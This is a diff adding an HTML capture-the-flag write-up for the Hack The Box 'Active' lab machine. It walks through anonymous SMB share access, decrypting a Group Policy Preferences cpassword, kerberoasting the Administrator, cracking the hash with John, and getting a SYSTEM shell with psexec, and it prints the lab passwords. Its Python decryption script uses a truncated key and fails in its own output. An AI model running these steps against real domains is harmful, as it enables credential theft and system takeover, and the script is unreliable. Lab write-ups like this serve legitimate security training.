@@ -1,1 +1,185 @@
-test
+<div class="writeup-content">
+    <div style="text-align: center;">
+        <h1>Hack The Box</h1>
+        <h2>Active</h2>
+        <img src="/pngs/HTB/Easy/Active/Active.png" alt="Active Banner" style="border:none; width: 300px; margin-bottom: 20px;">
+        <h3 style="color: #3fb950;">Level: Easy</h3>
+    </div>
+
+    <h3 class="step-header">1. Enumeration</h3>
+    <p>I started with port enumeration:</p>
+    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.100</div>
+    
+    <ul>
+        <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
+        <li><strong>-sS</strong>: SYN stealth scan.</li>
+        <li><strong>-Pn</strong>: Disable ICMP Echo request.</li>
+        <li><strong>--min-rate</strong>: How many packets should be sent simultaneously.</li>
+        <li><strong>-n</strong>: disables DNS resolution.</li>
+        <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
+    </ul>
+
+    <p>I got a lot of ports open</p>
+    <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250609204628.png">
+
+    <p>I started by enumerating the smb shares anonymously.</p>
+    <div class="terminal-box">
+    smbclient -N -L \\\\10.10.10.100
+    Anonymous login successful
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    C$              Disk      Default share
+    IPC$            IPC       Remote IPC
+    NETLOGON        Disk      Logon server share 
+    Replication     Disk      
+    SYSVOL          Disk      Logon server share 
+    Users           Disk      
+    SMB1 disabled -- no workgroup available
+    </div>
+        
+    <ul>
+        <li><strong>-N</strong> : login anonymously.</li>
+        <li><strong>-L</strong> : list the shares.</li>
+    </ul>
+    <p>There I found some files under Replication share.</p>
+
+    <div class="terminal-box">smbclient -N \\\\10.10.10.100\\Replication</div>
+
+    <p>The one that was more important for me it was the 'Groups.xml' file which was under here</p>:
+    <p><code>'\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups'</code>.</p>
+    <p>This is the contents of the 'Groups.xml' file.</p>
+    <div class="terminal-box">
+        <xmp>
+            <?xml version="1.0" encoding="utf-8"?>
+            <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+            <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
+            name="active.htb\SVC_TGS" image="2" 
+            changed="2018-07-18 20:46:06" 
+            uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
+            <Properties action="U" newName="" fullName="" description=""
+            cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+            changeLogon="0" noChange="1" neverExpires="1" 
+            acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+            </Groups>
+        </xmp>
+    </div> 
+
+    <p>Then I crafted this script to decode the password.</p>
+
+    <div class="terminal-box">
+        <xmp>
+            from Crypto.Cipher import AES
+            import base64
+
+            # GPP AES key
+            key = bytes.fromhex("4e9906e8fcb64f2ea3786f4d2b0d7b1b")
+
+            # Exact cpassword value from XML
+            cpassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+            cpassword = cpassword.strip().replace('\n', '')  # Sanitize
+            cpassword += '=' * (-len(cpassword) % 4)         # Fix padding
+
+            # Decrypt
+            decoded = base64.b64decode(cpassword)
+            cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00' * 16)
+            decrypted_bytes = cipher.decrypt(decoded)
+
+            try:
+                decrypted = decrypted_bytes.decode("utf-16le").rstrip("\x00")
+                print(f"Decrypted password: {decrypted}")
+            except UnicodeDecodeError as e:
+                print("[!] Failed to decode as UTF-16LE")
+                print("Raw decrypted bytes:", decrypted_bytes)
+        </xmp>
+    </div>
+    
+    <p>This was the output, after I run the command.</p>
+
+    <div class="terminal-box">
+        python3 exploit.py
+
+        [!] Failed to decode as UTF-16LE
+        Raw decrypted bytes: b' \x027\x8d\xa4%@\x17Ca\x80
+        \xdf\xf3\x03\xef\xc0W[\x1f\xfc1\x08+v\x11\x8cl
+        \xfe\xe4\x977?s\xad\x08\x16bZ\xd9u\xf3\x01I\\\
+        xa1\x82~\x9en\x1fO\xc6l\x08R#B\xd6[:u,\x1c\x1d'
+    </div>
+
+    <p>Then ChatGTP decrypted it to this:</p>
+
+    <fieldset style="width: fit-content;">
+        <legend>Credentials</legend>
+        GPPstillStandingStrong2k18
+    </fieldset>
+
+    <p>A different way to decrypt it is by using this command :</p>
+    <div class="terminal-box">
+    gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+    </div>
+
+    <p>Now I can join and get the user flag via the smb shares.</p>
+    <div class="terminal-box">
+    smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+    </div>
+    <p>Or with this command.</p>
+    <div class="terminal-box">
+    smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+
+    smb: \SVC_TGS\desktop\> get user.txt
+    </div>
+    
+    <fieldset class="root-box">
+        <legend>User Flag</legend>
+        <code>44602ba38ae8dc2155165b667a....</code>
+    </fieldset>
+</div>
+    
+    <h3 class="step-header">3. Privilege Escalation</h3>
+    <p>Since I know it is a Windows machine and I have credentials for a user I started kerberoasting.</p>
+    <p>I used the <code>GetUserSPNs.py</code> from Impacket's toolset :</p>
+    <div class="terminal-box">
+    GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100
+    </div>
+
+    <p>I dumped a Service Principal Name (SPN) tied to administrator, which means I can roast the Administrator's TGS  Kerberos service ticket .</p>
+   <div class="terminal-box">
+    active/CIFS:445       
+    Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 
+    2018-07-18 22:06:40.351723  2025-06-09 20:33:56.672571 
+   </div>
+
+   <p>I want to extract the Administrator's hash, and I use the '-request' flag.</p>
+   <div class="terminal-box">
+    GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
+   </div>
+   <p>Where I get this response :</p>
+   <img src="/pngs/HTB/Easy/Artic/Pasted%20image%2020250610001134.png">
+   <p>I cracked the hash by using John The Ripper tool :</p>
+   <div class="terminal-box">
+    ~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash
+
+    Ticketmaster1968
+   </div>
+
+   <p>The next tool that I used was the <code>psexec.py</code> to get the SYSTEM shell :</p>
+   <div class="terminal-box">
+    psexec.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100
+   </div>
+
+    <div class="terminal-box">nc -lvnp 4446</div>
+
+    <fieldset class="root-box">
+        <legend>System Flag</legend>
+        <code>197332f25b2082922596d055ac92....</code>
+    </fieldset>
+
+    <h3 class="step-header">4. Privilege Escalation - Second way</h3>
+    <p>We can use <code>smbmap</code> tool to print us the shares, what permissions we have and to get the flag :</p>
+    <div class="terminal-box">
+    smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
+
+    smb: \> get \users\administrator\desktop\root.txt
+    </div>
+</div>
